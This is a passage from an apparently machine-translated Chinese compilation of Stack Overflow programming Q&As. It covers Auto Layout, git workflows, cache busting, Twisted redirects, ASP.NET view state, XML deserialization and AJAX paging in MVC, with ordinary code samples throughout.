@property (nonatomic, strong) UILabel* moneyFiveLabel;
@property (nonatomic, strong) UILabel* moneySixLabel;
...
[self.view addSubview:moneyOneLabe];
[self.view addSubview:moneyTwoLabe];

moneyOneLabel.translatesAutoresizingMaskIntoConstraints = NO;
moneyTwoLabel.translatesAutoresizingMaskIntoConstraints = NO
etc
...

[self.view addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[_moneyOneLabel(moneyLabelWidth)]-[_moneyTwoLabel(moneyLabelWidth)]-[_moneyThreeLabel(moneyLabelWidth)]-[_moneyFourLabel(moneyLabelWidth)]-[_moneyFiveLabel(moneyLabelWidth)]-[_moneySixLabel(moneyLabelWidth)]-|"
                                                                  options:0
                                                                  metrics:@{@"moneyLabelWidth":@(moneyLabelWidth)}
                                                                    views:NSDictionaryOfVariableBindings(_moneyOneLabel, _moneyTwoLabel, _moneyThreeLabel, _moneyFourLabel, _moneyFiveLabel, moneySixLabel)]];
/*add vertical constraints*/ 
```

上面的 constrainsWithVisualFormat 基本上说从左边缘到右边缘水平绘制 6 个货币标签，宽度均为 20，它们之间的宽度是可变的。我还没有运行此代码，但我认为它会起作用（或至少接近）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-25T10:11:48.883

最简单的方法是在每个视图之间使用**2 个约束。**一个**大于或等于**，一个**小于或等于**。最小尺寸（Greater Then 或 Equal）应该是纵向模式下的间距。最大尺寸（小于或等于）应该是横向模式下的间距。

这与我为这个问题提供的解决方案相同：

[使用自动布局在调整大小时平等地改变空间](https://stackoverflow.com/questions/14195638/using-auto-layout-to-change-spaces-equally-on-resizing/14507459#14507459)

# git - GIT 新手并尝试设置本地/远程开发设置

> ID：13076624
> 
> 赞同：0
> 
> 时间：2012-10-25T20:20:46.993
> 
> 标签：git

```
local
    - [dev]
    - [staging.foo.com]
    - [foo.com]

remote
    - [staging.foo.com]
    - [foo.com] 
```

我是 git 新手，所以请告诉我我是否过度复杂化了。我真的很想为自己设置这样的东西，但我花了一整天的时间试图弄清楚这一点并让它一切正常。[] 是单独的目录。

在本地，我想要我将致力于分期的开发人员。然后将登台推送到远程登台进行测试。然后，一旦一切都是黄金，我会现场直播本地演出。直播也将被复制到本地，以保持开发工作流程分开。这有意义吗？

我会把它设置为分支吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:26:24.493

将功能代码与开发代码与暂存代码与发布代码与稳定代码分离是一项更适合分支的工作。请参阅：[http](http://nvie.com/posts/a-successful-git-branching-model/) : //nvie.com/posts/a-successful-git-branching-model/ 这几乎是处理这类事情的规范方式。

因此，在您的设置中，我只需要您的本地 git 存储库和一个中央存储库，然后使用分支来保持事物井井有条。

# html - 为什么 Firefox 有时会缓存我的 CSS 和 Javascript 代码，即使它已经更改？

> ID：13076627
> 
> 赞同：7
> 
> 时间：2012-10-25T20:20:58.853
> 
> 标签：html, css, caching, browser, assets

在我的产品网站上，Firefox 有时“检测不到”我的 CSS 和 Javascript 代码中的更改。而是加载旧版本，所以我似乎需要清除缓存。在这样的情况下，我该怎么办？这与最新的 Firefox（撰写本文时为 16.0.1）有关。

编辑！

我忘了说 localhost css 文件出错了。我的意思是，有一个旧的 js 文件，我更新它，上传它，然后在产品服务器上，firefox 认为它是 localhost 文件。我包含文件的方式：

```
<link rel="stylesheet" href="/xyz.css" type="text/css" /> 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-25T20:23:24.390

如果您使用的是服务器端语言，则可以使用技巧。您可以在 .css/.js 之后附加一个字符串。以 PHP 为例：

```
<link rel="stylesheet" type="text/css" href="/style.css?t=<?= time(); ?>" /> 
```

它会更改每个页面重新加载。

看看这篇关于[缓存破坏](http://www.adopsinsider.com/ad-ops-basics/what-is-a-cache-buster-and-how-does-it-work/)的文章。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-25T20:22:27.220

您可以使用一种称为“缓存破坏”的技术，将查询字符串附加到对 css/js 文件的调用中。然后，每当您更新 css/js 时，您都会更新查询字符串。

例子：

```
<link rel="stylesheet" type="text/css" href="/styles.css?ver=1" /> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-02T01:19:42.850

正如在其他几个答案中提到的，您希望*根据内容*为静态资产拥有一个唯一标识符，即当且仅当内容发生变化时，标识符才会发生变化。这样，只要内容没有改变，浏览器仍然可以使用资源的缓存版本——这正是你想要的。这种技术称为*静态资产版本控制*。

所以不要使用当前时间或随机数/字符串。如果可以，请使用文件的修改时间或（更好）其内容的 md5 哈希。您可以将此标识符附加为查询字符串（将被忽略）或（[更好](http://raibledesigns.com/rd/entry/versioning_static_assets_with_urlrewritefilter)）将其附加到扩展名之前的文件名。

为了与其他答案中提到的[缓存清除](http://www.adopsinsider.com/ad-ops-basics/what-is-a-cache-buster-and-how-does-it-work/)技术进行对比并消除混淆：*缓存清除*是广告商使用的一种技术，用于强制浏览器始终重新加载资源，以便广告商可以通过数量来衡量广告展示次数请求资源的次数。这很容易通过使用随机数来实现。您通常*不想*将其用于静态资产。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-25T20:22:29.393

您可以在发送的 css/js 末尾附加一个版本。

例如

代替`www.foo.com/js/javascript.js`，发送`www.foo.com/js/javascript.js?v=1`和
代替`www.foo.com/css/style.css`，发送`www.foo.com/css/style.js?v=1`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-10-25T20:25:35.527

*   您可以使用元标记来强制刷新。`<meta http-equiv="Cache-control" content="no-cache">`, 或`<meta http-equiv="pragma" content="no-cache">`.
*   您可以强制使用 HTTP 标头：`Cache-control: no-cache`或`Pragma: no-cache`.
*   您可以将随机查询字符串附加到 CSS 和 JavaScript 文件中。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-25T20:23:17.477

恐怕只是要清除缓存或硬刷新（Ctrl + F5）。

另一种选择是简单地更改 JS 或 CSS 文件的文件名，以便 FF 不会将其识别为缓存文件（例如，将 style.css 重命名为 style2.css）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-10-25T20:24:22.417

`style.css?randomnumber`将确保加载

# python - 扭曲的位置标头重定向

> ID：13076634
> 
> 赞同：2
> 
> 时间：2012-10-25T20:21:19.977
> 
> 标签：python, redirect, http-headers, location, twisted

从in的`render_GET`方法，是否可以完全重定向到不同的 url（托管在其他地方）`Resource``twisted`

`request.redirect(url)`似乎没有做任何事情，也没有`twisted.web.util.Redirect`

php中的等价物是，

```
header('location:'.$url); 
```

## 编辑

这是我正在运行的代码

```
from twisted.web import server, resource
from twisted.internet import reactor

class Simple(resource.Resource):
    isLeaf = True
    def render_GET(self, request):
        request.redirect("www.google.com")
        request.finish()

site = server.Site(Simple())
reactor.listenTCP(8080, site)
reactor.run() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T21:18:07.973

最后我在另一张海报的帮助下解决了这个问题`request.finish()`，重定向包括`http://`并返回`NOT_DONE_YET`

```
from twisted.web import server, resource
from twisted.internet import reactor

class Simple(resource.Resource):
    isLeaf = True
    def render_GET(self, request):
        request.redirect("http://www.google.com")
        request.finish()
        return server.NOT_DONE_YET

site = server.Site(Simple())
reactor.listenTCP(8080, site)
reactor.run() 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T02:50:31.520

[`Location`标头需要绝对网址](https://www.rfc-editor.org/rfc/rfc2616#section-14.30)，例如`http://example.com`.

[302 Found](https://www.rfc-editor.org/rfc/rfc2616#section-10.3.3)响应代码表明我们应该提供一个简短的超文本注释，其中包含指向新 URI 的超链接。`redirectTo()`正是这样做的：

```
from twisted.web import server, resource
from twisted.web.util import redirectTo
from twisted.internet import reactor

class HelloResource(resource.Resource):
    isLeaf = True

    def render_GET(self, request):
        return redirectTo('http://example.com', request)

reactor.listenTCP(8080, server.Site(HelloResource()))
reactor.run() 
```

或使用`Redirect`：

```
from twisted.web import server
from twisted.web.util import Redirect
from twisted.internet import reactor

reactor.listenTCP(8080, server.Site(Redirect("http://example.com")))
reactor.run() 
```

或者只是使用`web`twistd插件，放入`redirect.rpy`文件：

```
from twisted.web.util import Redirect

resource = Redirect("http://example.com") 
```

跑：

```
$ twistd -n web --port tcp:8080:localhost --resource-script redirect.rpy 
```

只是为了演示，下面是实现的[`redirectTo()`](https://github.com/powdahound/twisted/blob/93389d012a77dae35ddc6d99b014064ffe8734b8/twisted/web/util.py#L29)样子：

```
def redirect_to(url, request):
    request.setResponseCode(302) # Found
    request.setHeader("Location", url)
    request.setHeader("Content-Type", "text/html; charset=UTF-8")
    return """put html with a link to %(url)s here""" % dict(url=url) # body 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:25:41.253

您应该能够通过使用`request.redirect(url)`然后调用来重定向`request.finish()`。请确认您正在呼叫`request.finish()`。

# debugging - 确定使用 OllyDbg 调用函数的速率

> ID：13076637
> 
> 赞同：0
> 
> 时间：2012-10-25T20:21:31.380
> 
> 标签：debugging, reverse-engineering, ollydbg

如何找出每秒使用 OllyDbg 调用特定函数的次数？或者，如何计算 EIP 具有特定值的总次数？

我不希望 OllyDbg 在执行此代码时中断。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T05:20:13.400

我相信您可以通过使用跟踪功能来实现这一点，使用条件日志记录，新的 OllyDBG 似乎使用一些更好的功能实现了跟踪。自从我这样做以来已经有一段时间了，但是您可以检查一下。但我实际上建议使用 Immunity Debugger（一个带有 python 插件接口的 OllyDBG 克隆），并且可能编写一个 python 脚本来执行此操作。

# iphone - “评价这个应用程序”停止在 iOS 上运行

> ID：13076640
> 
> 赞同：1
> 
> 时间：2012-10-25T20:21:37.510
> 
> 标签：iphone, ios, rate, review

“ `rate this app`”链接在我所有 iOS 发布的应用程序中都停止工作。现在，当我点击“评分”按钮时，我从应用商店收到以下错误消息：`"Error Cannot connect to iTunes Store".`

我的应用程序每天收到 20 条评论，直到前天和昨天我没有收到 - 所以这可能是一个全球性问题。同样的情况也发生在我的一位开发者朋友身上。值得注意的是，我们都住在巴西的圣保罗 (SP)。你们是否面临同样的问题？任何人都可以解释一下吗？

# c# - 在 C# 中，环回连接总是被拒绝

> ID：13076642
> 
> 赞同：-1
> 
> 时间：2012-10-25T20:21:52.223
> 
> 标签：c#, sockets, tcp

我刚刚在这上面花了两天时间。这是在游戏引擎 Unity3D 中运行的，但这不应该有所作为。这两行总是失败：

```
TcpClient client = new TcpClient();
client.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 15219)); 
```

我得到的错误是：

```
System.Net.Sockets.SocketException: No connection could be made because the target machine actively refused it.

  at System.Net.Sockets.Socket.Connect (System.Net.EndPoint remoteEP, Boolean requireSocketPolicy) [0x00000] in <filename unknown>:0 
  at System.Net.Sockets.Socket.Connect (System.Net.EndPoint remoteEP) [0x00000] in <filename unknown>:0 
  at System.Net.Sockets.TcpClient.Connect (System.Net.IPEndPoint remote_end_point) [0x00000] in <filename unknown>:0 
  at StreamIn.Connect (System.String server, System.String message) [0x00011] in C:\XXX\StreamIn.cs:41 
UnityEngine.Debug:Log(Object)
StreamIn:uPrint(String) (at Assets/StreamIn.cs:27)
StreamIn:Connect(String, String) (at Assets/StreamIn.cs:77)
StreamIn:Start() (at Assets/StreamIn.cs:18) 
```

我已经尝试了一切，包括更改我的防火墙设置和禁用防火墙。

我收到与虚拟 IP 地址相同的错误。

如果我尝试使用 port`80`而不是`15219`， Unity 编辑器会冻结。（我确实有一个 Web 服务器正在运行。）

我错过了一些明显的东西吗？还是不明显？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:56:16.517

我总是发现在我的 .NET 代码之外使用不同的网络工具来全面检查这些东西很有用。我认为[hercules](http://www.hw-group.com/products/hercules/index_en.html)对此非常有用，因为您可以轻松地打开一个 tcp 服务器供您的应用程序连接，和/或从客户端的角度测试连接。

# git - rebase 后安全删除本地分支 - 替换 git branch --merged

> ID：13076643
> 
> 赞同：3
> 
> 时间：2012-10-25T20:21:55.243
> 
> 标签：git, git-branch, git-rebase

我必须更改旧提交中的提交消息才能将其推送到远程服务器。这个提交只是在我的机器上，所以我可以交互地重新设置它，然后修改它。

我通常会在推送到远程服务器后删除所有未使用的本地分支，为此我经常使用

```
 git branch --merged 
```

仔细检查我可以删除哪些分支。然而，这个命令只是在提交历史中倒退，以检查哪些分支是可访问的。当我进行变基时，我使用的分支不在输出中，并且我不是 100% 确信我的最后更改都包含在变基之后。这听起来很奇怪，我知道。

我如何知道在变基后可以安全删除哪些分支？我应该担心这个还是 rebase 比我想象的更安全？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T21:11:59.467

由于您没有更改 rebase 中的任何文件，因此您可以检查您的历史记录是否包含另一个分支的树。

你可以得到另一个分支的树 SHA1

```
git log --pretty=format:%t -n 1 other_branch 
```

然后在您的历史记录中搜索它：

```
git log --pretty=format:"%t %ai %s" | grep <tree_SHA1_you_found> 
```

如果你得到了一些东西，这意味着在你的历史记录中，你拥有与另一个分支完全相同的文件集。

# c# - 在方法c#之间重置私有变量

> ID：13076646
> 
> 赞同：6
> 
> 时间：2012-10-25T20:22:09.850
> 
> 标签：c#, scope

这可能是有史以来最大的菜鸟问题，但我很困惑为什么我的私有变量在一种方法中设置时会在另一种方法中重置。我的代码中有这样的东西：

```
namespace Project.Messages
{
public partial class Inbox : System.Web.UI.Page
{

    private static int selectedIndex;
    private static string messageIDString;
    private static int messageID; 

    //select message to view
    protected void viewMessage(object sender, GridViewCommandEventArgs e)
    {
            //get index
            selectedIndex = MsgInbox.SelectedIndex;
            if (int.TryParse(e.CommandArgument.ToString(), out selectedIndex))
            {
                //get selected dataKey, convert to a int
                messageIDString = MsgInbox.DataKeys[selectedIndex].Value.ToString();
                messageID = Convert.ToInt16(messageIDString);
            }
     }

    //select message to delete
    protected void delBTN_Click(object sender, EventArgs e)
    {

        SqlCommand com = new SqlCommand("DELETE FROM Messages WHERE MessageID =    @param1", conn);
        conn.Open();

        com.Parameters.AddWithValue("param1", messageID);
    } 
```

因此，如果我单击一条消息，则会设置 messageID 并显示该消息。但是，当我在那之后单击删除消息时，看起来变量正在重置/与以前设置的值不同。我是否需要使用静态变量或其他东西来实现这一点？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T20:26:53.777

这就是行为。当有回发时，所有变量都被重置并重新分配。您可以使用会话或视图状态或将值存储在页面上的控件中，该控件已经是视图状态的一部分，例如在隐藏字段中

```
public int messageID
{
   get 
   { 
      int retVal = 0;
      if(ViewState["messageID"] != null)
         Int32.TryParse(ViewState["messageID"].ToString(), out retVal); 

      return retVal;
   }
   set { ViewState["messageID"] = value; }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-25T20:25:25.587

这是因为 ASP.NET，而不是 C#。您需要将变量保存在视图状态中。请参阅：[在类中初始化的变量随着页面加载而丢失其先前的值](https://stackoverflow.com/questions/10838426/variable-initialized-in-class-loses-its-previous-value-with-the-page-loading)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T21:51:24.813

您还可以使用 Session 对象来存储请求之间所需的信息。例如：`Session["messageIdString"]=value`

欲了解更多信息： http: [//msdn.microsoft.com/en-us/library/ms178581 (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms178581(v=vs.100).aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T20:27:38.487

这是因为网络是无状态的。下面是一些在页面之间传递数据的方法。

ASP.net MVC： http: [//msdn.microsoft.com/en-us/library/dd394711 (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/dd394711(v=vs.100).aspx)

ASP.net 网络表单 [http://msdn.microsoft.com/en-us/library/6c3yckfw(v=VS.100).aspx](http://msdn.microsoft.com/en-us/library/6c3yckfw(v=VS.100).aspx)

希望这可以帮助。

# ruby-on-rails-3 - 将 best_in_place 与 TinyMCE 等富文本编辑器一起使用

> ID：13076653
> 
> 赞同：5
> 
> 时间：2012-10-25T20:22:46.777
> 
> 标签：ruby-on-rails-3, jeditable, edit-in-place, best-in-place, rich-text-editor

我正在使用`best_in_place`gem 在 Rails 应用程序中进行就地编辑。但是，我需要对某些文本区域进行 (X)HTML 编辑，因此我需要一个富文本编辑器。TinyMCE 正在网站的其他地方使用。

但是，将编辑器添加到`best_in_place`. 过于简单化了，gem 使用 jQuery 动态插入`textarea`标签，TinyMCE 在页面加载时初始化，用`textarea`编辑器替换 available s，所以当`best_in_place`放入它时`textarea`，TinyMCE 已经来了又走了。我尝试在`best_in_place`插入其 textarea 后重新初始化 TinyMCE，但我认为我没有在代码中找到正确的位置来执行此操作，因为到目前为止它还没有工作。

有[传言](http://railscasts.com/episodes/302-in-place-editing?view=comments#comment_154834)说这种集成是可能的，但在我的网络搜索中没有看到任何文档，所以欢迎指点。（同样，[这个答案](https://stackoverflow.com/a/452762/306084)没有帮助，指向两个断开的链接。）我认为我首选的解决方案顺序类似于

*   以下是如何将 TinyMCE 与`best_in_place`
*   TinyMCE 无法做到这一点，但这是使用另一个富文本编辑器的方法
*   它无法完成，`best_in_place`但这是 Rails 3.2.x的[另一种富文本就地编辑解决方案。](https://www.ruby-toolbox.com/categories/rails_in_place_editing)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T14:50:12.513

我放弃了尝试这样做`best_in_place`，所以写的这个问题仍然有更好的答案。但是，对于那些以后可能会发现这个问题并想知道我最终想出什么的人，这就是我最后所做的：

1.  垃圾`best_in_place`。
2.  对jeditable [-rails 插件](https://github.com/afeld/jeditable-rails)进行了分叉，以将[Jeditable](http://www.appelsiini.net/projects/jeditable)作为就地编辑器。
3.  [调整插件](https://github.com/pjmorse/jeditable-wysiwyg-rails)以提供 Jeditable、[jWYSIWYG](https://github.com/akzhan/jwysiwyg)和 Jeditable-jWYSIWYG 自定义输入作为 Rails 资产管道的资产（以及 jWYSIWYG 的相关 CSS 和图像）。
4.  利润！（并不真地。）

无论如何，如果您尝试在 Rails 3.2 中进行富文本就地编辑，请尝试[jeditable-wysiwyg-rails](https://github.com/pjmorse/jeditable-wysiwyg-rails)插件。[它也为markItUp 编辑器](http://markitup.jaysalvat.com/home/)提供资产，尽管因为我没有使用它，我不确定它们是否都在那里和/或安排得当。

# javascript - GET 和 POST 的奇怪行为

> ID：13076658
> 
> 赞同：0
> 
> 时间：2012-10-25T20:23:16.963
> 
> 标签：javascript, html, rest, post, get

我正在尝试在 iOS 中使用 Web 服务来复制此表单的功能。我遇到了一个问题。每当我向它发送帖子时，我都会收到一条错误消息

```
<html><head>
<title>410 Gone</title>
</head><body>
<h1>Gone</h1>
/prod/bwckschd.p_get_crse_unsechas been permanently removed from this server.</p>
</body></html> 
```

当我转到[此页面](https://selfservice.mypurdue.purdue.edu/prod/bwckschd.p_disp_dyn_sched?)并选择 Spring 2013 时，它会将我带到[此页面](https://selfservice.mypurdue.purdue.edu/prod/bwckgens.p_proc_term_date). 问题是，只有在您通过第一页到达那里时才会加载第 2 页。该网站如何知道您是否经过那里？我四处寻找，发现它发送了一个值为 p_calling_proc=bwckschd.p_disp_dyn_sched 和 p_term=201320（对于 2013 年春季）的 POST 请求。当我向 page2 发送此 POST 命令时，我得到的结果与我只访问了第 2 页而没有访问第 1 页的结果相同：“/prod/bwckgens.p_proc_term_date 已从该服务器中永久删除。” 然后我认为我应该更像一个网络浏览器，并最初向第一页发送一个 GET 请求。当我收到响应时，我应该发送一个填写了上述数据的 POST 请求。当我这样做时，我仍然得到同样的错误。有什么我没有考虑到的吗？我要做的就是发送 GET/POST 请求，这样我就可以获得所提供课程的列表。

第二个页面基本上向[这个页面](https://selfservice.mypurdue.purdue.edu/prod/bwckschd.p_get_crse_unsec)发送一个 POST 请求，其中包含以下变量： term_in=201320&sel_subj=CS&sel_day=dummy&sel_schd=dummy&sel_insm=dummy&sel_camp=dummy&sel_levl=dummy&sel_sess=dummy&sel_instr=dummy&sel_ptrm=dummy&sel_attr=dummy

有人可以帮我弄清楚如何复制这种行为吗？我对 Web 开发知之甚少，我觉得我在这里错过了一个阻碍我完成这个应用程序的关键点。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:27:23.900

很可能第一页设置了第二页检查的 cookie。

# c# - 反序列化 XML 元素返回 null 3

> ID：13076660
> 
> 赞同：1
> 
> 时间：2012-10-25T20:23:19.393
> 
> 标签：c#, xml-deserialization

我已经针对同一问题查看了其他几个问题，但未能解决我的问题。我有如下的类、代码和 XML。但是，在 Deserialize 调用之后，我的类型变量包含一个 TestList 数组，其中包含一个 TestElement 但 TestElement 为空。感谢任何帮助。谢谢。

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml.Serialization;

namespace TestXMLSerialization
{
    class Program
    {
        static void Main(string[] args) {
            XmlSerializer ser = new XmlSerializer(typeof(TestRootElement));
            string xmlString = "<?xml version=\"1.0\" ?><TestRootElement><TestList><TestItem><TestElement>Test Data</TestElement></TestItem></TestList></TestRootElement>";
            TestRootElement type = (TestRootElement)ser.Deserialize(new StringReader(xmlString));

            Console.WriteLine(type.TestList[0].TestElement);
        }
    }

    [Serializable()]
    [System.Xml.Serialization.XmlRoot("TestRootElement")]
    public class TestRootElement
    {
        [System.Xml.Serialization.XmlElement("TestList")]
        public List<TestItem> TestList { get; set; }
    }

    [Serializable()]
    [System.Xml.Serialization.XmlType("TestItem")]
    public class TestItem
    {
        [System.Xml.Serialization.XmlElement("TestElement")]
        public string TestElement { get; set; }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T12:31:18.430

结果代码在没有任何序列化属性的情况下工作正常。

```
public class TestRootElement
{
    public List<TestItem> TestList { get; set; }
}

public class TestItem
{
    public string TestElement { get; set; }
} 
```

因此，一次添加一个属性，我发现 List<> 需要一个 XmlArray 属性而不是 XmlElement。

```
[Serializable()]
[System.Xml.Serialization.XmlRoot("TestRootElement")]
public class TestRootElement
{
    [XmlArray("TestList")]
    public List<TestItem> TestList { get; set; }
}

[Serializable()]
[XmlType("TestItem")]
public class TestItem
{
    [XmlElement("TestElement")]
    public string TestElement { get; set; }
} 
```

# javascript - Wordpress 页面中的 Javascript

> ID：13076664
> 
> 赞同：0
> 
> 时间：2012-10-25T20:23:42.673
> 
> 标签：javascript, wordpress, mouseover

我想在**Wordpress**页面中运行以下 javascript。因此，我将脚本直接复制到页面的源代码中。图像全部显示，但“鼠标悬停”效果不起作用..

我测试了嵌入在普通 html 页面中的脚本（直接作为代码），它运行良好。

非常感谢您的帮助和想法！

```
 <script type="text/javascript">
                var imgArray = new Array(
                    'pic1.jpg',
                    'pic2.jpg',
                    'pic3.jpg',
                    'pic4.jpg',
                    'pic5.jpg'
                );

                function swapImage(imgID) {
                    var theImage = document.getElementById('theImage');
                    var newImg;
                    newImg = imgArray[imgID];
                    theImage.src = newImg;
                }

                function preloadImages() {      
                    for(var i = 0; i < imgArray.length; i++) {
                        var tmpImg = new Image;
                        tmpImg.src = imgArray[i];
                    }
                }
            </script>

            <div id="image">
                <img id="theImage" src="images/pic1.jpg" alt="" />
            </div>

            <div id="thumbs">
                <img src="images/pic1_tn.jpg" alt="" onmouseover="swapImage(0);" />
                <img src="images/pic2_tn.jpg" alt="" onmouseover="swapImage(1);" />
                <img src="images/pic3_tn.jpg" alt="" onmouseover="swapImage(2);" />
                <img src="images/pic4_tn.jpg" alt="" onmouseover="swapImage(3);" />
                <img src="images/pic5_tn.jpg" alt="" onmouseover="swapImage(4);" />
                <br />

            </div> 
```

# asp.net - ajax 分页 asp.net mvc

> ID：13076665
> 
> 赞同：0
> 
> 时间：2012-10-25T20:23:48.753
> 
> 标签：asp.net, asp.net-mvc

我知道如何将 ajax 分页连接到 asp.net mvc 中的网格或 webgrid。但是，我怎样才能完成 ajax 分页，对表格网格之外的另一种格式的大型数据集使用自定义分页。

这甚至可以使用 mvc 帮助程序或 mvc.pagedlist 吗？

我曾经是一个 webforms 人，很容易连接一个列表视图，您可以在其中使用 div 为单个项目创建您想要的任何布局，然后您可以连接一个数据页并将其全部包装在一个更新面板中。

基本上我想要一个可以通过 ajax 分页的项目列表，但是由于拥有大型数据集，我可以通过 jquery 拉下所有项目和页面，我需要在服务器端进行自定义分页，并且只返回项目特定页面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-11T13:46:06.443

您可以创建与此类似的简单 HtmlHelper：

```
public static class HtmlPaginHelper
{        
    public static MvcHtmlString PagerNoLastPage(this AjaxHelper ajaxHelper,
                                                int page,
                                                int pageSize,
                                                bool isLastPage,
                                                Func<int, string> pageUrl,
                                                Func<int, AjaxOptions> pageAjaxOptions)
    {
        var result = new StringBuilder();

        var firstPageAnchor = new TagBuilder("a");
        firstPageAnchor.SetInnerText("<<");

        var prevPageAnchor = new TagBuilder("a");
        prevPageAnchor.SetInnerText("<");

        var nextPageAnchor = new TagBuilder("a");
        nextPageAnchor.SetInnerText(">");

        var currentPageText = new TagBuilder("span");
        currentPageText.SetInnerText(string.Format("Page: {0}", page));

        if (page > 1)
        {
            firstPageAnchor.MergeAttribute("href", pageUrl(1));
            firstPageAnchor.MergeAttributes(pageAjaxOptions(1).ToUnobtrusiveHtmlAttributes());

            prevPageAnchor.MergeAttribute("href", pageUrl(page - 1));
            prevPageAnchor.MergeAttributes(pageAjaxOptions(page - 1).ToUnobtrusiveHtmlAttributes());
        }
        if (!isLastPage)
        {
            nextPageAnchor.MergeAttribute("href", pageUrl(page + 1));
            nextPageAnchor.MergeAttributes(pageAjaxOptions(page + 1).ToUnobtrusiveHtmlAttributes());
        }

        result.Append(firstPageAnchor);
        result.Append(prevPageAnchor);
        result.Append(currentPageText);
        result.Append(nextPageAnchor);

        return MvcHtmlString.Create(result.ToString());
    }
} 
```

...然后在 Razor 视图中使用它：

网格结果在这里...

```
@Ajax.PagerNoLastPage(Model.Query.Page,
                            Model.Query.PageSize,
                            Model.Data.IsLastPage,
                            i => Url.Action("Index", RouteValues(i)),
                            i => new AjaxOptions
                                     {
                                         UpdateTargetId = "content",
                                         InsertionMode = InsertionMode.Replace,
                                         HttpMethod = "GET",
                                         Url = Url.Action("Grid", RouteValues(i))
                                     }) 
```

其中 RouteValues(i) 定义如下：

```
@functions {
    private object PageRouteValues(int i)
    {
        return new
                   {
                       payId = Model.Query.PayId,
                       clientCode = Model.Query.ClientCode,
                       fromDate = Model.Query.FromDate,
                       tillDate = Model.Query.TillDate,
                       payNum = Model.Query.PayId,
                       checkNum = Model.Query.CheckNum,
                       payType = Model.Query.PayType,
                       payStatus = Model.Query.PayStatus,
                       page = i,
                       pageSize = Model.Query.PageSize
                   };
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T22:13:59.037

通过重用局部视图和一些 ajax，这在 MVC 中很容易完成。

将此模型作为属性添加到页面的 ViewModel 以处理分页：

```
namespace Models.ViewModels
{    
    [Serializable()]
    public class PagingInfoViewModel
    {

        public int TotalItems { get; set; }
        public int ResultsPerPage { get; set; }
        public int CurrentPage { get; set; }
        public int TotalPages {
            get { return Convert.ToInt32(Math.Ceiling(Convert.ToDecimal(this.TotalItems) / this.ResultsPerPage)); }
        }
        public string LinkTextShowMore { get; set; }
        public string LinkTextShowingAll { get; set; }
        /// <summary>
        /// Paging url used by the jQuery Ajax function
        /// </summary>
        public string UrlGetMore { get; set; }

        public PagingInfoViewModel(string linkTextShowMore, string linkTextShowingAll, int resultsPerPage)
        {
            this.LinkTextShowMore = linkTextShowMore;
            this.LinkTextShowingAll = linkTextShowingAll;
            this.ResultsPerPage = resultsPerPage;
        }
    }
} 
```

将以下代码添加到局部视图以处理分页：

```
 //Start Pagination
    //determine the value for the X for "Showing X of Y"
    {
        int currentTotal = 0;
        if ((Model.PagingInfo.CurrentPage * Model.PagingInfo.ResultsPerPage) < Model.PagingInfo.TotalItems) {
            //the current max item we are displaying is less than the total number of policies
            //display the current max item index\
            currentTotal = Model.PagingInfo.CurrentPage * Model.PagingInfo.ResultsPerPage;
        } else {
            //the current is greater than the total number of policies
            //display the total number of policies
            currentTotal = Model.PagingInfo.TotalItems;
        }
        if (Model.PagingInfo.TotalPages == 0 || Model.PagingInfo.CurrentPage == Model.PagingInfo.TotalPages) 
{
        @<li>
            <h3>@Model.PagingInfo.LinkTextShowingAll</h3>
            <p><strong>Showing @currentTotal Of @Model.PagingInfo.TotalItems</strong></p>
        </li>

        } else {
        @<li id="GetMore">
                <a href="#" id="lnkGetMore">
                    <h3>@Model.PagingInfo.LinkTextShowMore</h3>
                    <p><strong>Showing @(currentTotal) Of @Model.PagingInfo.TotalItems</strong></p>
                </a> 
        </li>
        @<script type="text/javascript"  lang="javascript">
             $('#lnkGetMore').click(function () {
                 $.ajax({
                     url: "@Model.PagingInfo.UrlGetMore",
                     success: function (data) {
                         $('#ProducerList li:last').remove();
                         $('#ProducerList').append(data);
                         $('#ProducerList').listview('refresh');
                     }
                 });
                 return false;
             });
        </script>
        }
    } 
```

现在，最后的 javascript 专门用于使用 ul 和 li 的 UI，但可以根据您的需要轻松定制。

当模型传递给视图时，该`UrlGetMore`属性在后端设置。我相信有一种更优雅的方法可以做到这一点。这是我使用的代码：

```
//build paging url used by the jQuery Ajax function
view.PagingInfo.UrlGetMore == Url.RouteUrl("RouteItemList", new { page = view.PagingInfo.CurrentPage + 1 }) 
```

最后，这是处理初始视图和后续部分视图（ajax 调用）的操作

```
public ActionResult List(UserModel user, ViewModel view, int page = 1)
{

    IQueryable<model> models = this.RetrieveModels(user, view);

    if ((models != null) && models.Count > 0) {
        view.PagingInfo.CurrentPage = page;
        view.PagingInfo.ResultsPerPage = user.Preferences.ResultsPerPage;
        view.PagingInfo.TotalItems = models.Count;

